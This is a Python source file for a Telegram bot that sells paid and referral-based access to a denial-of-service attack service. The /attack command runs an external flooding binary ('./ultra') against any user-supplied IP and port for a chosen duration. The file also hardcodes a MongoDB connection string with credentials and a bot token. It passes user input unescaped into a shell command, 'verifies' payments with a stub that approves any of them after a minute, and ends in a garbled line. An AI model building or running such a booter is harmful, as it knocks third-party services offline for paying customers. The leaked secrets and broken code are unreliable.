import asyncio
import random
import string
import logging
import qrcode
from io import BytesIO
from datetime import datetime, timedelta, timezone
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext, MessageHandler, filters
from pymongo import MongoClient
from flask import Flask, request, jsonify
import threading
import time

# Configure logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Database setup
MONGO_URI = 'mongodb+srv://Magic:Spike@cluster0.fa68l.mongodb.net/TEST?retryWrites=true&w=majority&appName=Cluster0'
client = MongoClient(MONGO_URI)
db = client['TEST']
users_collection = db['VIP']
redeem_codes_collection = db['redeem_codes0']
payments_collection = db['payments']
transactions_collection = db['transactions']
referrals_collection = db['referrals']
coins_collection = db['user_coins']

# Bot configuration
TELEGRAM_BOT_TOKEN = '7225741439:AAHGeV8lDWpC8isQVNlU2po2MWvfjIQ34IQ'
ADMIN_USER_ID = 6135948216
WEBHOOK_PORT = 8443
WEBHOOK_URL = "https://yourdomain.com/payment-webhook"  # Change this to your domain

# Payment configuration
PAYMENT_PROVIDER = "upi://pay?pa=your.upi.id@upi&pn=YourBusinessName&mc=0000&tn=VIPAccess"
PLAN_PRICES = {
    '1d': 10,    # 1 day - ₹10
    '7d': 50,     # 7 days - ₹50
    '30d': 200,   # 30 days - ₹200
    '90d': 500,   # 90 days - ₹500
}
valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.', '100.', '235.')

# Coin system configuration
COIN_PER_REFERRAL = 5    # 5 coins per successful referral
KEY_PRICE = 100          # 100 coins for 1 day VIP key

# Initialize Flask app for webhook
web_app = Flask(__name__)

# Payment verification status
class PaymentStatus:
    PENDING = "pending"
    COMPLETED = "completed"
    FAILED = "failed"

# Attack cooldown tracking
cooldown_dict = {}
user_attack_history = {}

# ==================== CORE FUNCTIONS ====================
async def is_user_allowed(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry_date = user.get('expiry_date')
        if expiry_date:
            if expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
            if expiry_date > datetime.now(timezone.utc):
                return True
    return False

def generate_transaction_id(user_id):
    return f"VIP{user_id}{int(time.time())}"

def calculate_expiry(plan):
    if plan.endswith('d'):
        days = int(plan[:-1])
        return datetime.now(timezone.utc) + timedelta(days=days)
    elif plan.endswith('h'):
        hours = int(plan[:-1])
        return datetime.now(timezone.utc) + timedelta(hours=hours)
    return datetime.now(timezone.utc) + timedelta(days=1)

# ==================== PAYMENT SYSTEM ====================
async def buy(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if len(context.args) < 1:
        plans_text = "\n".join([f"/buy {plan} - ₹{price}" for plan, price in PLAN_PRICES.items()])
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"*💰 Available VIP Plans:*\n{plans_text}\n\nExample: `/buy 7d`",
            parse_mode='Markdown'
        )
        return
    
    plan = context.args[0].lower()
    if plan not in PLAN_PRICES:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ Invalid plan. Use /buy to see available plans.*",
            parse_mode='Markdown'
        )
        return
    
    amount = PLAN_PRICES[plan]
    txn_id = generate_transaction_id(user_id)
    
    payments_collection.insert_one({
        "txn_id": txn_id,
        "user_id": user_id,
        "plan": plan,
        "amount": amount,
        "status": PaymentStatus.PENDING,
        "created_at": datetime.now(timezone.utc),
        "expiry_date": calculate_expiry(plan)
    })
    
    qr = qrcode.QRCode(version=1, box_size=10, border=5)
    qr.add_data(f"{PAYMENT_PROVIDER}&am={amount}&tid={txn_id}")
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    
    bio = BytesIO()
    img.save(bio, "PNG")
    bio.seek(0)
    
    await context.bot.send_photo(
        chat_id=update.effective_chat.id,
        photo=bio,
        caption=f"*💳 Pay ₹{amount} for {plan} VIP access*\n\n"
                f"*Transaction ID:* `{txn_id}`\n"
                f"*After payment, send:* `/check {txn_id}`\n\n"
                f"⚠️ Payments are verified automatically within 5 minutes",
        parse_mode='Markdown'
    )

async def check_payment(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if len(context.args) < 1:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Usage: /check <transaction_id>*",
            parse_mode='Markdown'
        )
        return
    
    txn_id = context.args[0]
    payment = payments_collection.find_one({"txn_id": txn_id, "user_id": user_id})
    
    if not payment:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ Transaction not found.*",
            parse_mode='Markdown'
        )
        return
    
    if payment['status'] == PaymentStatus.COMPLETED:
        user = users_collection.find_one({"user_id": user_id})
        expiry_date = user.get('expiry_date', payment['expiry_date'])
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"*✅ Payment already processed!*\nExpiry: {expiry_date.strftime('%Y-%m-%d %H:%M')}",
            parse_mode='Markdown'
        )
        return
    
    is_verified = await verify_payment_with_gateway(txn_id)
    
    if is_verified:
        await activate_vip_access(user_id, payment['plan'], payment['expiry_date'], txn_id)
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"*✅ Payment verified! VIP access activated for {payment['plan']}.*\n"
                 f"*Expiry:* {payment['expiry_date'].strftime('%Y-%m-%d %H:%M')}",
            parse_mode='Markdown'
        )
    else:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ Payment not verified yet. Please try again later.*",
            parse_mode='Markdown'
        )

async def verify_payment_with_gateway(txn_id):
    """Simulate payment verification with gateway"""
    payment = payments_collection.find_one({"txn_id": txn_id})
    if payment and (datetime.now(timezone.utc) - payment['created_at']).total_seconds() > 60:
        return True
    return False

async def activate_vip_access(user_id, plan, expiry_date, txn_id):
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"expiry_date": expiry_date}},
        upsert=True
    )
    
    payments_collection.update_one(
        {"txn_id": txn_id},
        {"$set": {"status": PaymentStatus.COMPLETED}}
    )
    
    transactions_collection.insert_one({
        "user_id": user_id,
        "txn_id": txn_id,
        "plan": plan,
        "amount": PLAN_PRICES[plan],
        "status": PaymentStatus.COMPLETED,
        "processed_at": datetime.now(timezone.utc)
    })

# ==================== WEBHOOK ====================
@web_app.route('/payment-webhook', methods=['POST'])
def payment_webhook():
    try:
        data = request.json
        txn_id = data.get('txn_id')
        status = data.get('status')
        
        if not txn_id or not status:
            return jsonify({"success": False, "error": "Invalid data"}), 400
        
        payment = payments_collection.find_one({"txn_id": txn_id})
        if not payment:
            return jsonify({"success": False, "error": "Transaction not found"}), 404
        
        if status.lower() == "completed":
            user_id = payment['user_id']
            asyncio.run(activate_vip_access(
                user_id,
                payment['plan'],
                payment['expiry_date'],
                txn_id
            ))
            
            application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
            asyncio.run(application.bot.send_message(
                chat_id=user_id,
                text=f"*✅ Payment received! VIP access activated for {payment['plan']}.*\n"
                     f"*Expiry:* {payment['expiry_date'].strftime('%Y-%m-%d %H:%M')}",
                parse_mode='Markdown'
            ))
        
        return jsonify({"success": True}), 200
    
    except Exception as e:
        logger.error(f"Webhook error: {str(e)}")
        return jsonify({"success": False, "error": str(e)}), 500

# ==================== ADMIN COMMANDS ====================
async def list_payments(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ Admin only command")
        return
    
    days = int(context.args[0]) if len(context.args) > 0 else 1
    cutoff = datetime.now(timezone.utc) - timedelta(days=days)
    
    payments = list(payments_collection.find({
        "created_at": {"$gte": cutoff}
    }).sort("created_at", -1))
    
    if not payments:
        await update.message.reply_text(f"No payments in last {days} days")
        return
    
    message = [f"💳 Payments (last {days} days):"]
    for payment in payments:
        status_icon = "✅" if payment['status'] == PaymentStatus.COMPLETED else "🕒"
        message.append(
            f"{status_icon} {payment['txn_id']} - "
            f"User: {payment['user_id']} - "
            f"Plan: {payment['plan']} - "
            f"₹{payment['amount']} - "
            f"{payment['created_at'].strftime('%Y-%m-%d %H:%M')}"
        )
    
    await update.message.reply_text("\n".join(message))

# ==================== ATTACK SYSTEM ====================
async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return
    
    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return
    
    ip, port, duration = args
    if not ip.startswith(valid_ip_prefixes):
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid IP address! Please use an IP with a valid prefix.*", parse_mode='Markdown')
        return
    
    cooldown_period = 0
    current_time = datetime.now()
    if user_id in cooldown_dict:
        time_diff = (current_time - cooldown_dict[user_id]).total_seconds()
        if time_diff < cooldown_period:
            remaining_time = cooldown_period - int(time_diff)
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*⏳ BHAI RUK JAO {remaining_time}*",
                parse_mode='Markdown'
            )
            return
    
    if user_id in user_attack_history and (ip, port) in user_attack_history[user_id]:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already attacked this IP and port combination!*", parse_mode='Markdown')
        return
    
    cooldown_dict[user_id] = current_time
    if user_id not in user_attack_history:
        user_attack_history[user_id] = set()
    user_attack_history[user_id].add((ip, port))
    
    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            f"*💀 WARNING: THE END IS NIGH! 💀*\n"
            f"*🎯 Target Locked: {ip}:{port}*\n"
            f"*⏳ Countdown: {duration} seconds*\n"
            f"*🔥 Get ready for pure devastation. 💥*\n"
            f"*⚠️ You've just signed your death warrant. ⚠️*"
        ),
        parse_mode='Markdown'
    )
    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./ultra {ip} {port} {duration} 800",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

# ==================== REDEEM SYSTEM ====================
async def generate_redeem_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*❌ You are not authorized to generate redeem codes!*", 
            parse_mode='Markdown'
        )
        return
    
    if len(context.args) < 1:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚠️ Usage: /gen [custom_code] <days/minutes> [max_uses]*", 
            parse_mode='Markdown'
        )
        return
    
    max_uses = 1
    custom_code = None
    time_input = context.args[0]
    
    if time_input[-1].lower() in ['d', 'm']:
        redeem_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    else:
        custom_code = time_input
        time_input = context.args[1] if len(context.args) > 1 else None
        redeem_code = custom_code
    
    if time_input is None or time_input[-1].lower() not in ['d', 'm']:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚠️ Please specify time in days (d) or minutes (m).*", 
            parse_mode='Markdown'
        )
        return
    
    if time_input[-1].lower() == 'd':  
        time_value = int(time_input[:-1])
        expiry_date = datetime.now(timezone.utc) + timedelta(days=time_value)
        expiry_label = f"{time_value} day"
    elif time_input[-1].lower() == 'm':  
        time_value = int(time_input[:-1])
        expiry_date = datetime.now(timezone.utc) + timedelta(minutes=time_value)
        expiry_label = f"{time_value} minute"
    
    if len(context.args) > (2 if custom_code else 1):
        try:
            max_uses = int(context.args[2] if custom_code else context.args[1])
        except ValueError:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text="*⚠️ Please provide a valid number for max uses.*", 
                parse_mode='Markdown'
            )
            return
    
    redeem_codes_collection.insert_one({
        "code": redeem_code,
        "expiry_date": expiry_date,
        "used_by": [], 
        "max_uses": max_uses,
        "redeem_count": 0
    })
    
    message = (
        f"✅ Redeem code generated: `{redeem_code}`\n"
        f"Expires in {expiry_label}\n"
        f"Max uses: {max_uses}"
    )
    await context.bot.send_message(
        chat_id=update.effective_chat.id, 
        text=message, 
        parse_mode='Markdown'
    )

async def redeem_code(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <code>*", parse_mode='Markdown')
        return
    
    code = context.args[0]
    redeem_entry = redeem_codes_collection.find_one({"code": code})
    
    if not redeem_entry:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid redeem code.*", parse_mode='Markdown')
        return
    
    expiry_date = redeem_entry['expiry_date']
    if expiry_date.tzinfo is None:
        expiry_date = expiry_date.replace(tzinfo=timezone.utc)  
    
    if expiry_date <= datetime.now(timezone.utc):
        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has expired.*", parse_mode='Markdown')
        return
    
    if redeem_entry['redeem_count'] >= redeem_entry['max_uses']:
        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has already reached its maximum number of uses.*", parse_mode='Markdown')
        return
    
    if user_id in redeem_entry['used_by']:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already redeemed this code.*", parse_mode='Markdown')
        return
    
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"expiry_date": expiry_date}},
        upsert=True
    )
    
    redeem_codes_collection.update_one(
        {"code": code},
        {"$inc": {"redeem_count": 1}, "$push": {"used_by": user_id}}
    )
    
    await context.bot.send_message(chat_id=chat_id, text="*✅ Redeem code successfully applied!*\n*You can now use the bot.*", parse_mode='Markdown')

# ==================== USER MANAGEMENT ====================
async def add_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to add users!*", parse_mode='Markdown')
        return
    
    if len(context.args) != 2:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /add <user_id> <days/minutes>*", parse_mode='Markdown')
        return
    
    target_user_id = int(context.args[0])
    time_input = context.args[1] 
    
    if time_input[-1].lower() == 'd':
        time_value = int(time_input[:-1])  
        total_seconds = time_value * 86400 
    elif time_input[-1].lower() == 'm':
        time_value = int(time_input[:-1])  
        total_seconds = time_value * 60
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Please specify time in days (d) or minutes (m).*", parse_mode='Markdown')
        return
    
    expiry_date = datetime.now(timezone.utc) + timedelta(seconds=total_seconds) 
    users_collection.update_one(
        {"user_id": target_user_id},
        {"$set": {"expiry_date": expiry_date}},
        upsert=True
    )
    
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} added with expiry in {time_value} {time_input[-1]}.*", parse_mode='Markdown')

async def remove_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to remove users!*", parse_mode='Markdown')
        return
    
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
        return
    
    target_user_id = int(context.args[0])
    users_collection.delete_one({"user_id": target_user_id})
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} removed.*", parse_mode='Markdown')

async def list_users(update, context):
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ Admin only command")
        return
    
    current_time = datetime.now(timezone.utc)
    users = users_collection.find()    
    user_list_message = "👥 User List:\n" 
    
    for user in users:
        user_id = user['user_id']
        expiry_date = user['expiry_date']
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=timezone.utc)  
        
        time_remaining = expiry_date - current_time
        days_remaining = time_remaining.days
        hours_remaining = time_remaining.seconds // 3600
        
        status = "✅ Active" if expiry_date > current_time else "❌ Expired"
        user_list_message += (
            f"🆔 {user_id} - {status}\n"
            f"   ⏳ {days_remaining}d {hours_remaining}h remaining\n"
            f"   📅 Expires: {expiry_date.strftime('%Y-%m-%d %H:%M')}\n\n"
        )
    
    await update.message.reply_text(user_list_message)

# ==================== REFERRAL & COIN SYSTEM ====================
async def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    username = update.effective_user.username
    
    # Check if this is a referral
    if len(context.args) > 0 and context.args[0].startswith('ref_'):
        referrer_id = int(context.args[0][4:])
        
        # Prevent self-referral
        if referrer_id != user_id:
            # Check if user already exists
            if not users_collection.find_one({"user_id": user_id}):
                # Check if this is the first time this user is being referred
                if not referrals_collection.find_one({"referred_user": user_id}):
                    # Add referral record
                    referrals_collection.insert_one({
                        "referrer_id": referrer_id,
                        "referred_user": user_id,
                        "date": datetime.now(timezone.utc),
                        "processed": False
                    })
                    
                    # Update referrer's coins (but mark as unprocessed)
                    coins_collection.update_one(
                        {"user_id": referrer_id},
                        {"$inc": {"pending_coins": COIN_PER_REFERRAL}},
                        upsert=True
                    )
    
    # Send welcome message
    referral_link = f"https://t.me/{context.bot.username}?start=ref_{user_id}"
    coin_balance = coins_collection.find_one({"user_id": user_id}, {"balance": 1}) or {"balance": 0}
    
    welcome_msg = (
        f"👋 Welcome to the VIP Bot!\n\n"
        f"💰 Your coin balance: {coin_balance.get('balance', 0)}\n"
        f"🔗 Your referral link: {referral_link}\n\n"
        f"Earn {COIN_PER_REFERRAL} coins for each friend who joins using your link!\n\n"
        f"💎 Use /coins to check your balance\n"
        f"🔑 Use /buykey to get 1 day VIP for {KEY_PRICE} coins"
    )
    
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=welcome_msg,
        parse_mode='Markdown'
    )

async def check_referrals(context: CallbackContext):
    """Check and process pending referrals (run periodically)"""
    # Process referrals where the referred user has become VIP
    pending_referrals = referrals_collection.find({"processed": False})
    
    for referral in pending_referrals:
        referred_user = referral['referred_user']
        referrer_id = referral['referrer_id']
        
        # Check if referred user is now VIP
        if users_collection.find_one({"user_id": referred_user}):
            # Update coins balance (move from pending to actual)
            coins_collection.update_one(
                {"user_id": referrer_id},
                {"$inc": {"balance": COIN_PER_REFERRAL, "pending_coins": -COIN_PER_REFERRAL}},
                upsert=True
            )
            
            # Mark referral as processed
            referrals_collection.update_one(
                {"_id": referral['_id']},
                {"$set": {"processed": True}}
            )
            
            # Notify referrer
            try:
                await context.bot.send_message(
                    chat_id=referrer_id,
                    text=f"🎉 You earned {COIN_PER_REFERRAL} coins!\n"
                         f"User {referred_user} activated VIP using your referral link.\n"
                         f"Your balance: {coins_collection.find_one({'user_id': referrer_id})['balance']} coins",
                    parse_mode='Markdown'
                )
            except:
                pass

async def coins(update: Update, context: CallbackContext):
    """Check coin balance"""
    user_id = update.effective_user.id
    coin_data = coins_collection.find_one({"user_id": user_id}) or {"balance": 0, "pending_coins": 0}
    referral_link = f"https://t.me/{context.bot.username}?start=ref_{user_id}"
    
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"💰 *Your Coin Balance*\n\n"
             f"• Available: {coin_data.get('balance', 0)} coins\n"
             f"• Pending: {coin_data.get('pending_coins', 0)} coins\n\n"
             f"🔗 *Your Referral Link:*\n{referral_link}\n\n"
             f"Earn {COIN_PER_REFERRAL} coins for each friend who joins and becomes VIP!\n\n"
             f"Use /buykey to get 1 day VIP for {KEY_PRICE} coins",
        parse_mode='Markdown'
    )

async def buy_with_coins(update: Update, context: CallbackContext):
    """Buy VIP using coins"""
    user_id = update.effective_user.id
    
    # Check coin balance
    coin_data = coins_collection.find_one({"user_id": user_id}) or {"balance": 0}
    if coin_data.get('balance', 0) < KEY_PRICE:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ You don't have enough coins! You need {KEY_PRICE} coins for 1 day VIP.\n"
                 f"Your balance: {coin_data.get('balance', 0)} coins\n\n"
                 f"Use /coins to check your balance and get your referral link.",
            parse_mode='Markdown'
        )
        return
    
    # Deduct coins
    coins_collection.update_one(
        {"user_id": user_id},
        {"$inc": {"balance": -KEY_PRICE}},
        upsert=True
    )
    
    # Add VIP time
    expiry_date = datetime.now(timezone.utc) + timedelta(days=1)
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"expiry_date": expiry_date}},
        upsert=True
    )
    
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"✅ Successfully purchased 1 day VIP for {KEY_PRICE} coins!\n"
             f"New expiry: {expiry_date.strftime('%Y-%m-%d %H:%M')}\n"
             f"Remaining coins: {coin_data.get('balance', 0) - KEY_PRICE}",
        parse_mode='Markdown'
    )

# ==================== MAIN FUNCTION ====================
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # Command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("gen", generate_redeem_code))
    application.add_handler(CommandHandler("redeem", redeem_code))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("list", list_users))
    application.add_handler(CommandHandler("buy", buy))
    application.add_handler(CommandHandler("check", check_payment))
    application.add_handler(CommandHandler("payments", list_payments))
    application.add_handler(CommandHandler("coins", coins))
    application.add_handler(CommandHandler("buykey", buy_with_coins))
    
    # Add job queue for referral processing
    job_queue = application.job_queue
    job_queue.run_repeating(check_referrals, interval=3600, first=10)  # Check every hour
    
    # Start Flask webhook in a separate thread
    flask_thread = threading.Thread(
        target=web_app.run,
        kwargs={'port': WEBHOOK_PORT},
        daemon=True
    )
    flask_thread.start()
    
    # Start the bot
    application.run_polling()

if __name__ == '__main__':
    maTrue
